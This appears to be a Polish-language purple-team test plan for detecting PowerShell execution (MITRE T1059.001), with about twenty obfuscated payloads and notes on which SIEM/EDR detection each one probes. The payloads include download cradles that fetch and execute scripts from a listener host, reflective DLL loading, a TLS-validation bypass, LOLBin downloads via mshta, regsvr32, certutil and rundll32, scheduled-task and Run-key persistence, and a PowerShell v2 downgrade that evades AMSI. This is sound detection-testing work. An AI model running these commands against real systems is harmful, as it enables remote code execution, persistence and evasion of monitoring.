# T1059.001 — PowerShell Execution Test Plan

Uruchamiaj każdy payload **osobno, ręcznie, jeden po drugim** — nie w pętli.
Między każdym zostaw kilka sekund przerwy, żeby zdarzenia dały się rozdzielić
w logach SIEM/EDR po timestampie. Zapisuj czas startu każdego (`Get-Date`)
razem z wynikiem — to Twoja evidence do raportu.

Podmień `10.10.10.50` na adres swojego listenera przed startem (np. host,
na którym masz `python -m http.server`), i wgraj pliki ze stage'a (patrz
sekcja "Pliki wspierające" niżej) do `C:\purpletest\stage\` po stronie serwera
hostującego.

---

## 1. Encoded Command (baseline)
**Payload #1**
```powershell
powershell.exe -('en'+'c') dwBoAG8AYQBtAGkA
```
**Co robi:** dekoduje base64 do `whoami` i wykonuje. Bazowy test — sam
`-EncodedCommand` jest jednym z najczęściej monitorowanych argumentów CLI
PowerShella (Sysmon Event ID 1 / 4688 z command line).
**Co sprawdzasz:** czy w ogóle jest logowana obecność flagi `-enc` niezależnie
od tego co koduje; czy SIEM dekoduje base64 do czytelnej treści w alercie.

---

## 2. Obfuskacja stringów + ukryte okno
**Payload #3**
```powershell
powershell.exe -('No'+'P') -('Non'+'I') -W ('Hid'+'den') -('en'+'c') bgBlAHQAIAB1AHMAZQByACAAcAB0AF8AdQBzAGUAcgAxACAALwBkAG8AbQBhAGkAbgA=
```
**Co robi:** dekoduje do `net user pt_user1 /domain` z flagami `-NoProfile
-NonInteractive -WindowStyle Hidden`. Symuluje próbę cichego działania.
**Co sprawdzasz:** czy silnik detekcji wykrywa konkatenację stringów jako
technikę obfuskacji flag (`-('No'+'P')` zamiast `-NoP`) — to test AMSI/
Script Block Logging, bo command line w 4688 pokaże obfuskowaną wersję,
ale zawartość po deobfuskacji w script block logging (event 4104) powinna
pokazać czysty tekst.

---

## 3. Encoded + WindowStyle jawnie
**Payload #6**
```powershell
powershell.exe -WindowStyle ('Hid'+'den') -('en'+'c') dwBoAG8AYQBtAGkAIAAvAGcAcgBvAHUAcABzAA==
```
**Co robi:** `whoami /groups` z jawną flagą `-WindowStyle Hidden` (nie
obfuskowaną tym razem, tylko `-enc` jest obfuskowany).
**Co sprawdzasz:** czy reguła wychwytuje częściową obfuskację — tylko
niektóre flagi są "ukryte", inne jawne. Test na to, czy detekcja polega na
dopasowaniu całej command line czy na tokenizacji per-flaga.

---

## 4. Download Cradle — WebClient.DownloadString
**Payload #11**
```powershell
powershell.exe -('No'+'P') -C ".('I'+'EX') (New-Object ('Net.'+'Web'+'Client')).('Download'+'String').Invoke('http://10.10.10.50/stage/run.ps1')"
```
**Co robi:** pobiera `run.ps1` z hostowanego serwera i wykonuje go w pamięci
przez `IEX`. Klasyczny "download cradle" — jeden z najbardziej
sygnaturowanych wzorców w istnieniu (prawie każdy EDR ma na to regułę).
**Co sprawdzasz:** network-based detection (ruch wychodzący HTTP + treść
IEX), AMSI (powinno przechwycić zdeszyfrowaną zawartość przed wykonaniem),
oraz czy w ogóle transfer przechodzi przez firewall/proxy.
**Wymaga pliku:** `run.ps1` (patrz sekcja niżej).

---

## 5. Download Cradle — wariant z obiektem trzymanym w zmiennej
**Payload #16**
```powershell
powershell -('no'+'p') -c "$w=New-Object ('Net.'+'Web'+'Client');.('I'+'EX') $w.('Download'+'String').Invoke('http://10.10.10.50/c.ps1')"
```
**Co robi:** to samo co #11, ale obiekt WebClient jest trzymany w zmiennej
`$w` zamiast wywoływany inline.
**Co sprawdzasz:** czy detekcja oparta na regexach dopasowujących dokładny
wzorzec `(New-Object Net.WebClient).DownloadString` łapie też wariant, gdzie
wywołanie jest rozbite na dwie linie/zmienną — to test odporności reguły na
przeformułowanie tej samej logiki.
**Wymaga pliku:** `c.ps1`.

---

## 6. Reflective Assembly Load (DLL z dysku po pobraniu)
**Payload #25**
```powershell
powershell.exe -c "(New-Object ('Net.'+'Web'+'Client')).('Download'+'File').Invoke('http://10.10.10.50/mod.dll','C:\purpletest\stage\mod.dll'); [Reflection.Assembly]::LoadFile('C:\purpletest\stage\mod.dll')"
```
**Co robi:** pobiera plik DLL na dysk, a następnie ładuje go do procesu
PowerShell przez `[Reflection.Assembly]::LoadFile`. To już nie "in-memory
only" (plik trafia na dysk), ale sam load assembly to technika często
używana do uruchamiania .NET payloadów bez klasycznego `.exe`.
**Co sprawdzasz:** czy EDR monitoruje `Assembly.LoadFile`/`LoadFrom` jako
zdarzenie (część rozwiązań ma na to osobny sensor, inne w ogóle nie widzą),
oraz czy plik na dysku jest skanowany przed/po pobraniu.
**Wymaga pliku:** `mod.dll` (patrz sekcja — wymaga kompilacji).

---

## 7. TLS Certificate Validation Bypass + Cradle
**Payload #27**
```powershell
powershell.exe -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; .('I'+'EX') (New-Object ('Net.'+'Web'+'Client')).('Download'+'String').Invoke('https://10.10.10.50/s.ps1')"
```
**Co robi:** wyłącza walidację certyfikatu TLS (przyjmuje dowolny cert,
nawet self-signed/nieznany) przed pobraniem payloadu przez HTTPS.
**Co sprawdzasz:** czy manipulacja `ServerCertificateValidationCallback` jest
sama w sobie monitorowana (to dość specyficzny .NET call, rzadziej pokryty
regułami niż sam download cradle) — istotne w środowisku z SSL inspection,
bo pokazuje jak atakujący ominąłby Twoje własne problemy z zaufaniem CA.
**Wymaga:** serwer hostujący `s.ps1` po HTTPS (self-signed cert wystarczy —
o to tu chodzi).

---

## 8. Reflective Assembly Load (z lokalnie już obecnego pliku)
**Payload #42**
```powershell
powershell.exe -c "[System.Reflection.Assembly]::('Lo'+'ad').Invoke([IO.File]::ReadAllBytes('C:\purpletest\stage\lib.dll')) | Out-Null"
```
**Co robi:** czyta bajty DLL bezpośrednio z dysku (bez sieci) i ładuje przez
`Assembly.Load(byte[])` — wariant w pełni in-memory (nie zostawia śladu
LoadFile, bo assembly jest budowane z tablicy bajtów w pamięci).
**Co sprawdzasz:** różnicę w telemetrii między `LoadFile` (#25, dotyka
dysku bezpośrednio) a `Load(byte[])` (ten payload) — część EDR-ów łapie
tylko jeden z tych wzorców.
**Wymaga pliku:** `lib.dll` (może być identyczny plik co `mod.dll`).

---

## 9. Inline C# Compile (Add-Type)
**Payload #43**
```powershell
powershell -c "&('Add-'+'Ty'+'pe') -Path C:\purpletest\stage\helper.cs; [Helper.Main]::Go()"
```
**Co robi:** kompiluje kod C# "w locie" (Add-Type wywołuje csc.exe/Roslyn w
tle) i od razu wykonuje metodę z nowo utworzonej klasy.
**Co sprawdzasz:** czy proces potomny kompilatora (`csc.exe`) jest widoczny
w telemetrii jako osobny proces potomny PowerShella — to jeden z
mocniejszych indykatorów dla threat huntingu, bo legalny kod rzadko
kompiluje się w locie w środowisku produkcyjnym.
**Wymaga pliku:** `helper.cs`.

---

## 10. Process Spawn — Start-Process
**Payload #49**
```powershell
powershell -c "&('Start-'+'Process') ('ca'+'lc.exe')"
```
**Co robi:** uruchamia `calc.exe` jako nowy proces przez natywny cmdlet
`Start-Process`.
**Co sprawdzasz:** baseline dla łańcucha procesów — PowerShell jako parent,
calc.exe jako child. To punkt odniesienia do porównania z #55 i #57 (te
same efekt, inne API).

---

## 11. Process Spawn — WMI (Win32_Process.Create)
**Payload #55**
```powershell
powershell -c "&('Inv'+'oke-Wmi'+'Method') -Class ('Win32_'+'Process') -Name Create -ArgumentList 'calc.exe'"
```
**Co robi:** to samo — odpala calc.exe — ale przez WMI zamiast natywnego
cmdletu do spawnowania procesów.
**Co sprawdzasz:** WMI-based process creation ma **inny parent** w
telemetrii niż Start-Process — proces potomny często pojawia się jako
dziecko `WmiPrvSE.exe`, nie bezpośrednio powershell.exe. To klasyczna
technika omijania reguł EDR opartych na prostym "parent=powershell.exe".

---

## 12. Process Spawn — COM (WScript.Shell)
**Payload #57**
```powershell
powershell -c "(New-Object -ComObject ('WScript.'+'Shell')).Run(('cmd /c who'+'ami'),0,$false)"
```
**Co robi:** trzeci wariant tego samego efektu — uruchomienie procesu przez
COM object zamiast naitywnego API PowerShella czy WMI.
**Co sprawdzasz:** COM-based execution to kolejna droga z innym śladem w
telemetrii (WScript.Shell to bardzo stary, ale wciąż żywy wektor —
sprawdza czy EDR monitoruje instancjonowanie tego konkretnego ComObject).

---

## 13. LOLBin chain — mshta.exe
**Payload #60**
```powershell
powershell -c "&('Start-'+'Process') mshta.exe -ArgumentList ('http://10.10.10.50/poc.hta')"
```
**Co robi:** PowerShell odpala `mshta.exe`, który pobiera i wykonuje zdalny
plik HTA (HTML Application — może zawierać VBScript/JScript).
**Co sprawdzasz:** czy monitorowany jest sam fakt, że PowerShell spawnuje
`mshta.exe` (bardzo silny indykator ataku — mshta rzadko jest legalnie
wywoływane z PowerShella), niezależnie od zawartości HTA.
**Wymaga pliku:** `poc.hta`.

---

## 14. LOLBin chain — regsvr32 (Squiblydoo)
**Payload #63**
```powershell
powershell -c "&('regs'+'vr32') /s /n /u ('/i:'+'http://10.10.10.50/scrobj.dll') ('scr'+'obj.dll')"
```
**Co robi:** klasyczna technika "Squiblydoo" — regsvr32 pobiera zdalny
scriptlet (.sct udający .dll) i wykonuje go, omijając część kontrolek
AppLocker opartych na rozszerzeniu pliku.
**Co sprawdzasz:** czy ta konkretna, dobrze znana technika (ma własny
numer w MITRE — T1218.010) jest pokryta osobną regułą, niezależnie od
ogólnego monitoringu PowerShella.
**Wymaga pliku:** `scrobj.dll` na serwerze hostującym (patrz niżej — to w
rzeczywistości plik `.sct`, nie prawdziwy DLL).

---

## 15. LOLBin chain — certutil (download)
**Payload #64**
```powershell
powershell.exe -c "&('cert'+'util.exe') ('-url'+'cache') ('-sp'+'lit') -f ('http://10.10.10.50/cert.dat') C:\purpletest\stage\cert.dat"
```
**Co robi:** wykorzystuje wbudowane w Windows `certutil.exe` (normalnie do
zarządzania certyfikatami) jako alternatywny downloader — omija część
reguł skupionych tylko na `Invoke-WebRequest`/`WebClient`.
**Co sprawdzasz:** czy monitorowane jest użycie `certutil -urlcache` jako
znany LOLBin abuse (T1105 przez nietypowe narzędzie) — bardzo popularna
technika bo certutil jest zaufany i podpisany przez Microsoft.
**Wymaga pliku:** `cert.dat` (dowolna niewielka zawartość — patrz niżej).

---

## 16. LOLBin chain — rundll32
**Payload #69**
```powershell
powershell.exe -c "&('rund'+'ll32.exe') ('url.'+'dll,FileProtocolHandler') ('http://10.10.10.50/x')"
```
**Co robi:** wywołuje `rundll32.exe` z `url.dll,FileProtocolHandler`, co
efektywnie otwiera URL — klasyczna technika do pobrania/uruchomienia
zawartości bez bezpośredniego użycia przeglądarki czy PowerShella jako
downloadera.
**Co sprawdzasz:** czy ten konkretny, znany wzorzec wywołania rundll32 (z tą
dokładnie kombinacją DLL+funkcja) jest w bazie sygnatur EDR.

---

## 17. Persistence — Scheduled Task
**Payload #71**
```powershell
powershell -c "&('sch'+'tasks') /create /tn ('Purple'+'Test') /tr ('powershell -'+'no'+'p -w hid'+'den -c who'+'ami') /sc once /st 23:59 /f"
```
**Co robi:** tworzy zaplanowane zadanie, które przy najbliższym uruchomieniu
odpali ukrytą sesję PowerShella z `whoami`. **Nie usuwaj tego zadania
automatycznie** — sprawdź w raporcie, czy admin/blue team je zauważy, potem
posprzątaj ręcznie (`schtasks /delete /tn PurpleTest /f`).
**Co sprawdzasz:** czy tworzenie scheduled task z komendą PowerShell w
`/tr` (task run) generuje alert — to jeden z najczęstszych mechanizmów
trwałości i powinien mieć wysoki priorytet detekcji.

---

## 18. Persistence — Registry Run Key
**Payload #74**
```powershell
powershell.exe -c "&('Set-'+'Item'+'Property') -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name ('Purple'+'Test') -Value ('power'+'shell -no'+'p -w hid'+'den -c who'+'ami')"
```
**Co robi:** dodaje wpis do klucza `Run` w rejestrze — uruchomi się przy
każdym logowaniu użytkownika. **Pamiętaj o posprzątaniu** (`Remove-ItemProperty`)
po teście.
**Co sprawdzasz:** czy modyfikacja tego konkretnego klucza rejestru (jeden
z najstarszych i najczęściej monitorowanych kluczy trwałości, T1547.001)
generuje alert w czasie rzeczywistym.

---

## 19. PowerShell Class API (w pełni in-process)
**Payload #87**
```powershell
powershell -c "$ps=[PowerShell]::Create().AddScript(('who'+'ami')); $ps.Invoke()"
```
**Co robi:** tworzy nową instancję silnika PowerShell **wewnątrz** aktualnie
działającego procesu (przez klasę `[PowerShell]` z System.Management.Automation)
i wykonuje w niej kod, zamiast spawnować nowy proces `powershell.exe`.
**Co sprawdzasz:** to najbardziej "cichy" wariant z całej listy — nie ma
nowego procesu potomnego do złapania po command line, bo wszystko dzieje
się w ramach jednego PID-a. Test, czy detekcja oparta wyłącznie na command
line/process creation w ogóle to zauważy (prawdopodobnie tylko AMSI/Script
Block Logging złapie treść).

---

## 20. PowerShell v2 Downgrade Attack
**Payload #93**
```powershell
powershell.exe -('Ver'+'sion') 2 -c ('who'+'ami')
```
**Co robi:** wymusza uruchomienie silnika PowerShell w wersji 2.0 (jeśli
jest zainstalowana jako Windows Feature) — PSv2 nie ma AMSI, nie ma Script
Block Logging, nie ma większości mechanizmów bezpieczeństwa dodanych w
PSv3+.
**Co sprawdzasz:** (a) czy `.NET Framework 3.5`/PSv2 feature jest w ogóle
dostępne na hoście (jeśli nie — payload zwróci błąd, co samo w sobie jest
dobrym wynikiem: feature wyłączony = powierzchnia ataku zredukowana);
(b) jeśli jest dostępne, czy samo użycie flagi `-Version 2` jest
monitorowane jako known downgrade/evasion technique (powinno mieć wysoki
priorytet, bo to najbardziej "widoczny" IOC z całej listy).

---

## Podsumowanie pokrycia (dla raportu)

| # | Kategoria | Unikalny wektor detekcji |
|---|---|---|
| 1 | Encoded Command | CLI argument monitoring |
| 3 | Obfuskacja + Hidden window | Obfuskacja flag / deobfuskacja w 4104 |
| 6 | Częściowa obfuskacja | Tokenizacja per-flaga |
| 11 | Download cradle (WebClient) | Network + AMSI |
| 16 | Download cradle (zmienna) | Odporność regexa na przeformułowanie |
| 25 | Reflective load (LoadFile) | Assembly load z dysku |
| 27 | TLS bypass + cradle | Manipulacja walidacją certyfikatu |
| 42 | Reflective load (Load byte[]) | Assembly load w pamięci |
| 43 | Inline compile (Add-Type) | Proces potomny kompilatora |
| 49 | Process spawn (native) | Baseline parent-child |
| 55 | Process spawn (WMI) | Alternatywny parent (WmiPrvSE) |
| 57 | Process spawn (COM) | Alternatywna droga przez COM |
| 60 | LOLBin: mshta | T1218 |
| 63 | LOLBin: regsvr32 (Squiblydoo) | T1218.010 |
| 64 | LOLBin: certutil | T1105 przez zaufane narzędzie |
| 69 | LOLBin: rundll32 | T1218.011 |
| 71 | Persistence: Scheduled Task | T1053.005 |
| 74 | Persistence: Registry Run | T1547.001 |
| 87 | In-process PowerShell class | Brak nowego procesu — test granicy detekcji |
| 93 | PSv2 Downgrade | Evasion — wyłączenie AMSI/logging |

---

## Pliki wspierające (stage)

Wgraj zawartość katalogu `stage/` (patrz niżej) do miejsca, z którego
hostujesz (`C:\Users\...\stage\` na maszynie z `python -m http.server`,
serwowane jako `http://10.10.10.50/...`), tak żeby ścieżki URL w payloadach
się zgadzały:

- `run.ps1` → payload #11
- `c.ps1` → payload #16
- `s.ps1` → payload #27 (hostuj przez HTTPS, self-signed cert wystarczy)
- `mod.dll` → payload #25 (do pobrania przez sieć)
- `lib.dll` → payload #42 (musi być fizycznie w `C:\purpletest\stage\` NA
  hoście testowym, nie na hoście hostującym — ten payload nic nie pobiera)
- `helper.cs` → payload #43 (musi być fizycznie w `C:\purpletest\stage\` NA
  hoście testowym)
- `poc.hta` → payload #60
- `scrobj.dll` (w rzeczywistości plik .sct) → payload #63
- `cert.dat` → payload #64 (dowolna mała zawartość)

Payloady #49, #55, #57, #71, #74, #87, #93, #1, #3, #6 nie wymagają żadnych
plików — są samowystarczalne.
